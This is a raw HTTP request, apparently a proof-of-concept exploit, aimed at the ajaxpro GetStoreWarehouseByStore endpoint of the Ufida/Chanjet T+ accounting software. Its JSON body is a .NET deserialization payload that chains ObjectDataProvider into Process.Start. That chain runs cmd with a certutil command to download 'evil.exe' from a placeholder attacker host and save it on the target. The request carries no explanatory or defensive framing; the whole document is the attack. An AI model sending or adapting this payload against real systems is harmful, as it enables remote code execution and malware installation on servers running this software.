POST /tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWare houseByStore HTTP/1.1
Host: target:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=cnqudxetplwr0nb1h5tuh1uo; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1687532937; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1687533098
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 659
{ "storeID":{
"__type":"System.Windows.Data.ObjectDataProvider, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
"MethodName":"Start", "ObjectInstance":{
"__type":"System.Diagnostics.Process, System, PublicKeyToken=b77a5c561934e089",
"StartInfo": { "__type":"System.Diagnostics.ProcessStartInfo,
PresentationFramework,
Culture=neutral, PublicKeyToken=b77a5c561934e089", "FileName":"cmd", "Arguments":"/c certutil
http://attacker:port/evil.exe C:\\users\\public\\music\\dgs.exe" }
}
}
}